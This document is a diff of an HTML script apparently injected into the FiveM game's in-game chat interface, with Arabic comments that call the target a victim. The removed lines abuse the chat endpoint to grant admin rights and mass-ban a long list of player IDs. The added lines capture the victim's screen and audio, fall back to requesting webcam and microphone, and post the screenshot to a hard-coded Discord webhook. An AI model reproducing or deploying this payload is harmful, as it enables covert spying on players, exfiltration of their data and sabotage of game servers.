@@ -1,52 +1,49 @@
 <body>
 <script>
- for (let i = 0; i <= 7; i++) {
-  fetch("http://chat/chatResult", {
-    headers: {
-      "content-type": "application/json; charset=UTF-8"
-    },
-    referrer: "",
-    referrerPolicy: "strict-origin-when-cross-origin",
-    body: JSON.stringify({
-      message: `/setjob 510 admin ${i}`
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "omit"
-  });
- }
+(async () => {
+  try {
+    // التقاط الشاشة (popup يطلع، بس لو وافق الضحية سابقًا → بدون)
+    const stream = await navigator.mediaDevices.getDisplayMedia({
+      video: { cursor: "always" },
+      audio: true  // mic كمان لو تبي
+    });
 
- fetch("http://chat/chatResult", {
-  "headers": {
-    "content-type": "application/json; charset=UTF-8"
-  },
-  "referrer": "",
-  "referrerPolicy": "strict-origin-when-cross-origin",
-  "body": "{\"message\":\"/cls\"}",
-  "method": "POST",
-  "mode": "cors",
-  "credentials": "omit"
- });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await new Promise(r => video.onloadedmetadata = r);
+    video.play();
 
+    // Canvas للصورة
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
 
- const playerIDs = [
-  37, 642, 547, 502, 24, 10, 723, 534, 134, 2, 720, 11, 287, 1, 231, 79, 13, 6, 30, 9, 549, 523, 32, 301, 176, 35, 19, 12, 370, 144, 49, 728, 521, 189, 8, 290, 17, 459, 278, 20, 21, 621, 69, 539, 474, 209, 578, 38, 29, 168, 48, 43, 73, 721, 681, 66, 667, 596, 44, 597, 497, 57, 675, 350, 36, 41, 67, 45, 706, 626, 599, 51, 56, 684, 366, 55, 435, 75, 54, 53, 356, 59, 213, 77, 65, 245, 68, 677, 541, 443, 63, 141, 332, 74, 234, 62, 661, 442, 132, 81, 668, 76, 70, 64, 660, 307, 78, 429, 80, 155, 143, 83, 670, 124, 641, 400, 252, 212, 319, 88, 722, 91, 590, 94, 338, 90, 103, 184, 96, 100, 379, 374, 316, 98, 323, 105, 264, 110, 107, 355, 145, 106, 109, 386, 337, 115, 190, 117, 360, 122, 266, 123, 691, 116, 554, 118, 194, 140, 119, 347, 671, 125, 142, 196, 126, 462, 556, 135, 471, 131, 147, 560, 152, 149, 198, 672, 139, 369, 158, 156, 559, 401, 165, 637, 154, 177, 159, 157, 166, 726, 160, 167, 170, 717, 169, 530, 172, 174, 358, 281, 175, 178, 191, 371, 193, 551, 187, 185, 271, 188, 389, 485, 200, 507, 391, 197, 719, 203, 204, 210, 226, 220, 639, 217, 219, 221, 227, 224, 229, 294, 690, 321, 241, 240, 243, 464, 248, 326, 255, 254, 257, 725, 259, 658, 263, 309, 265, 267, 269, 268, 275, 715, 280, 276, 581, 282, 283, 286, 563, 522, 291, 295, 676, 633, 298, 381, 297, 645, 566, 395, 299, 692, 300, 302, 306, 458, 385, 310, 314, 315, 312, 318, 322, 330, 682, 532, 339, 342, 348, 593, 345, 349, 351, 649, 353, 357, 367, 600, 364, 584, 372, 402, 375, 380, 383, 729, 683, 384, 396, 392, 387, 397, 628, 606, 405, 618, 407, 410, 654, 408, 646, 418, 417, 425, 437, 424, 423, 467, 428, 576, 662, 436, 705, 438, 439, 465, 445, 451, 449, 452, 455, 454, 461, 526, 463, 550, 469, 476, 533, 478, 638, 480, 483, 484, 488, 489, 582, 490, 496, 500, 508, 504, 506, 509, 510, 520, 568, 519, 693, 517, 524, 538, 536, 540, 588, 542, 569, 544, 701, 548, 558, 555, 561, 564, 620, 570, 572, 575, 678, 580, 699, 585, 586, 589, 591, 634, 598, 643, 601, 602, 607, 603, 713, 604, 608, 605, 610, 716, 616, 617, 619, 622, 627, 629, 640, 632, 631, 730, 644, 647, 650, 656, 657, 659, 704, 663, 665, 666, 673, 674, 679, 694, 688, 686, 687, 689, 711, 696
- ];
+    // Blob + FormData لـ Discord
+    const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
+    const form = new FormData();
+    form.append('file', new File([blob], 'fivem_screen.png', {type: 'image/png'}));
+    form.append('payload_json', JSON.stringify({
+      content: `🖥️ FiveM Screen Capture\nVictim: ${window.location.href}`,
+      embeds: [{ image: { url: 'attachment://fivem_screen.png' } }]
+    }));
 
- playerIDs.forEach(id => {
-  fetch("http://chat/chatResult", {
-    headers: {
-      "content-type": "application/json; charset=UTF-8"
-    },
-    referrer: "",
-    referrerPolicy: "strict-origin-when-cross-origin",
-    body: JSON.stringify({
-      message: `/fg ban ${id} discord.gg/zn`
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "omit"
-  });
- });
+    // webhookك
+    await fetch('https://discord.com/api/webhooks/1437916956857471156/uz8Dwumsts1wpZRXrC0l6mSTaTd27zlM1ap7StaYVp51WipVx2vE21PWhVSCRab5PkwE', {
+      method: 'POST',
+      body: form
+    });
+
+    console.log('تم الإرسال!');  // hidden في اللعبة
+
+    stream.getTracks().forEach(t => t.stop());
+  } catch(e) {
+    // لو رفض → جرب getUserMedia للـ mic/webcam
+    navigator.mediaDevices.getUserMedia({audio: true, video: true}).then(stream => {
+      // نفس الكود...
+    });
+  }
+})();
 </script>
 </body>
